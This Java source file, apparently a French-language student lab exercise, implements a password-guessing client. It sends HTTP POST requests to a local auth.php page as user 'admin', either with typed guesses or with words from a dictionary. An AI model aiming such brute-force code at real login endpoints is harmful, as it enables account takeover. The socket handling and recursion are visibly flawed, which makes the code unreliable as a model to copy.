import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;



public class Hostt {

    

    public static void main(String[] args){

        Scanner inputScanner = new Scanner(System.in);

        DictionnaryCracker dictionnaryCracker = new DictionnaryCracker();


        int choice = menu(inputScanner);

        if (choice == 1){

            System.out.println("\nVous avez choisi d'attaquer par vous meme");

            sendRequest(inputScanner, false, dictionnaryCracker);
        }else {
            System.out.println("\nVous avez choisi l'attaque du Dictionnaire");

           // DictionnaryCracker dicionaryCracker = new DictionnaryCracker();
           sendRequest(inputScanner, true,dictionnaryCracker);

            // Ainsi on instancie un objet de la classe Dictionnaire ou on invoque la methode get

           // System.out.println("Bye");
        }

    }

   
















    public static int menu(Scanner scanner){

        int choice = 0;
        System.out.println("\nWelcome sur KayDevinerr".toUpperCase());
        System.out.println("\n(1) Deviner mot de passe par vous meme\n(2) Deviner par le Dictionnaire\n");
        do {
            System.out.print("\nEntrez un entier entre 1 et 2 : ");
            while (!scanner.hasNextInt()) {
                System.out.print("Oupps !! entrer un entier valide entre 1 et 2 : ");
                scanner.next(); // Ignorer l'entrée invalide
            }
            choice = scanner.nextInt();
        } while (choice < 1 || choice > 2);

        return choice;


    }

    public static  void sendRequest(Scanner inputScanner , Boolean isDictionnary,DictionnaryCracker dictionnaryCracker) {
        // Pour colorier le texte
        String ANSI_RESET = "\u001B[0m";
        String ANSI_RED = "\u001B[31m";
        String ANSI_GREEN = "\u001B[32m";



        try {

            // Etablissons  la connexion
            Socket socket = new Socket ("localhost", 80);

            // Creation des flux Input/Output pour l'envoi et la reception de donnees au Serveur via le Socket
            InputStream inputStream = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();
            
            // PrintWriter pour l'envoi de donnees au Serveur
            PrintWriter printWriter = new PrintWriter(outputStream, true);
            BufferedReader buffer = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));

           // On verifie si c'est l'utilisateur qui saisie ou c'est le Dictionnaire
            if (isDictionnary){

                String password = "";


                while ((password = dictionnaryCracker.getMotDePasse()) != null) {
                    System.out.println(password);
            
                    if (verifyPassword(password, printWriter, buffer, inputScanner)) {
                        // System.out.println("\n" + ANSI_GREEN + "Bienvenue cher Administrateur".toUpperCase() + ANSI_RESET + "\n");
                       // dictionnaryCracker.fermerDictionary();
                       
                    }
                    else{
                       sendRequest(inputScanner, true, dictionnaryCracker);


                    }
                }


        //     while ((password = dictionnaryCracker.getMotDePasse()) != null){

        //         System.out.println(password);

        //         if (verifyPassword(password, printWriter, buffer, inputScanner)){
        //             dictionnaryCracker.fermerDictionary();
                    
                   
                    
        //         }
        //         else {
        //             sendRequest(inputScanner, true, dictionnaryCracker);
        //         }


        // //         if (!verifyPassword(password,printWriter,buffer,inputScanner)){
        // //             System.out.println(password);
        // //             continue;
        // //         }else {
        // //             break;
        // //         }
        //    }

           //dictionnaryCracker.fermerDictionary();





            // while ((ligne = dictionnaire.obtenirLigneSuivante()) != null) {
            //     // Construire et envoyer la requête HTTP en utilisant la ligne du dictionnaire
            //     envoyerRequeteHTTP(ligne);
            //     if (reponseEstBonne()) {
            //         break;
            //     }
            // }
    
            // dictionnaire.fermer();
               // return;
           

           }else {


            System.out.print("\nVeuillez saisir votre mot de passe : ");

           }

            // On demande a l'utilisateur de saisir un mot de passe le Login est connu : admin
           
            String password = inputScanner.next();
            String line = "";


            // On appelle la methode prepareRequest qui prepare la requette a envoyer
            String request = prepareRequest(password);

            // On envoie la requette au serveur
            printWriter.println(request);

            // Maintenant on recupere le codeStatus sur la premier ligne=
            String firstLine= buffer.readLine();
            String lastLine = "";

            int codeStatus = Integer.parseInt(firstLine.split(" ")[1]);
            
            if (codeStatus == 200){

                System.out.println(ANSI_GREEN + "\nEnvoie reussi et CodeStatus : " + codeStatus + ANSI_RESET);

                // On recupere la reponse du Serveur

                lastLine = lastLine(buffer);


                // On appelle la methode qui verifie si le mot de passe est la bonne

                if (isGoodPassword(lastLine)){

                    System.out.println("\n" + ANSI_GREEN + "Bienvenue cher Administrateur".toUpperCase() + ANSI_RESET +  "\n");

                }else {

                    System.out.println("\n" + ANSI_RED + "Wrong Password" + ANSI_RESET +  "\n");
                    sendRequest(inputScanner,false, dictionnaryCracker);

                }

            }else {

               
                System.out.println("\n" + ANSI_RED + "Probleme Cote Serveur  ou Erreur au niveau de votre Script" + ANSI_RESET +  "\n");
                System.out.println(firstLine);

                // On affiche le reste de la Reponse

                while ((line = buffer.readLine()) != null){
                    System.out.println(line);
                }
                
            }   
            
            
            printWriter.close();
            buffer.close();
            socket.close();

        }catch (IOException e) {
            e.printStackTrace();
        }

    }



    public static Boolean  verifyPassword(String password, PrintWriter printWriter, BufferedReader buffer, Scanner inputScanner) throws IOException{

        String line = "";
        String ANSI_RESET = "\u001B[0m";
        String ANSI_RED = "\u001B[31m";
        String ANSI_GREEN = "\u001B[32m";


        // On appelle la methode prepareRequest qui prepare la requette a envoyer
        String request = prepareRequest(password);

        // On envoie la requette au serveur
        printWriter.println(request);

        // Maintenant on recupere le codeStatus sur la premier ligne=
        String firstLine= buffer.readLine();
        String lastLine = "";

        int codeStatus = Integer.parseInt(firstLine.split(" ")[1]);
        
        if (codeStatus == 200){

            System.out.println(ANSI_GREEN + "\nEnvoie reussi et CodeStatus : " + codeStatus + ANSI_RESET);

            // On recupere la reponse du Serveur

            lastLine = lastLine(buffer);


            // On appelle la methode qui verifie si le mot de passe est la bonne

            if (isGoodPassword(lastLine)){

                System.out.println("\n" + ANSI_GREEN + "Bienvenue cher Administrateur".toUpperCase() + ANSI_RESET +  "\n");

                return true;

            }else {

                System.out.println("\n" + ANSI_RED + "Wrong Password" + ANSI_RESET +  "\n");
                //sendRequest(inputScanner,false);

            }

        }else {

           
            System.out.println("\n" + ANSI_RED + "Probleme Cote Serveur  ou Erreur au niveau de votre Script" + ANSI_RESET +  "\n");
            System.out.println(firstLine);

            // On affiche le reste de la Reponse

            while ((line = buffer.readLine()) != null){
                System.out.println(line);
            }

            
            
        }
        return false;   

    }



    /**
     * si le mot de passe saisie est bon ou pas
     * @param lastLine
     * @return boolen
     */
    public static Boolean isGoodPassword(String lastLine) {
        
        return lastLine.equals("true");

    }



    /**
     * Permet de retourner la reponse du serveur en cas de succes 200 ok
     * @param buffer
     * @return lastLine
     * @throws IOException
     */
    public static String lastLine(BufferedReader buffer) throws IOException{
        String line = "";
        String lastLine = "";
        while ((line = buffer.readLine()) != null){

            lastLine = line;
            
        }

        return lastLine;
    }
    
    /**
     * Permet de retourner la taille de la donnee
     * @param data
     * @return taille de la donnee
     */
    public static int contentLength(String data) {

        byte[] postData = data.getBytes(StandardCharsets.UTF_8);

            return postData.length;

    }


    /**
     * Permet de retourner une requette bien prete
     * @param password
     * @return  request
     */
    public static String prepareRequest(String password){

        // Il appelle la methode contentLenght et lui passe la donne
        String data = "login=admin&password=" + password;


        return  "POST /TPDP/auth.php HTTP/1.1\r\n" +

        "Host:localhost" + "\r\n" +

        "Content-Type: application/x-www-form-urlencoded\r\n" +

        "Content-Length: " + contentLength(data) + "\r\n" +

        "\r\n" +

        data;
    }

    
}



